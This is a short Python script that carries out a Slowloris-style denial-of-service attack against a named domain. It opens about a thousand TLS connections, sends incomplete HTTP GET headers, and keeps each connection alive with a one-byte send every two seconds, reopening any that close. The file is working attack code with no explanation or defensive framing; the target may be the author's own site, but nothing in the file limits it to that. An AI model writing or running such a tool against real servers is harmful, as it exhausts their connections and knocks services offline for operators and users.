import socket
import time
import ssl
import random


host_name = "chinmayamahesh.me"
sockets = set()
num_connections = 1000
#s.settimeout(4)
#s = ssl.create_default_context().wrap_socket(s, server_hostname=host_name)
def make_socket():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    s = context.wrap_socket(sock, server_hostname=host_name)    
    s.connect((host_name, 443))
    first_part = "GET /?{} HTTP/1.1\r\nHost:%s".format(random.randint(1, 5000)) % host_name
    s.send(first_part.encode())  
    return s

for i in range(1, num_connections):
    print(i)
    sockets.add(make_socket())

while True:
    for so in sockets:
        try: 
            so.send(" ".encode())
            print("sent")
        except:
            sockets.remove(so)
    
    for i in range(num_connections - len(sockets)):
        sockets.add(make_socket())
    print(len(sockets))
    #print()
    time.sleep(2)
            


# request = "GET /?13 HTTP/1.1\r\nHost:%s\r\n\r\n" % host_name
# print(request)
# make_socket()
# #mid_part = "X-a: {}\r\n".format(50)



# second_part = "\r\n\r\n"


#time.sleep(30)


#s.send(second_part.encode())  

#s.send()
# receive some data

# response = s.recv(4096)  
# http_response = repr(response)
# http_response_len = len(http_response)
# print(response)